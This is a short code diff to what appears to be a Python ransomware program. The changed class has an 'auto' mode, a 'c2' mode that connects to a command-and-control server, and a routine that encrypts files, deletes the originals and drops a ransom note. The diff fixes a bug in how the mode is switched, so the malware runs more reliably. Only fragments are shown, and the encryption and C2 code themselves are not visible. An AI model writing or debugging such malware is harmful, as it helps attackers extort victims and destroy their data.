@@ -57,10 +57,11 @@ class Program():
         print("USE AT YOUR OWN RISK!\n")
 
     def __change_mode(self, new_mode = "manual"):
-        print(f"Mode changed to {self.__mode__}")
-        match self.__mode__:
+        print(f"Mode changed to {new_mode}")
+        match new_mode:
             case "auto":
                 print("Auto mode selected. The program will run without user interaction.")
+                self.__should_cli_run = False
                 self.__auto_mode()
             case "c2":
                 print("C2 mode selected. The program will attempt to connect to a command and control server.")
@@ -280,7 +281,7 @@ class Program():
         self.__setup(should_encrypt=True, should_delete_original=True)
         self.__encrypt()
         self.__ransomnote()
-        self.__should_cli_run = False
+        
 
     def load_key(self, key_filename: str = "secret.key"):
         if self.__criptography is None:
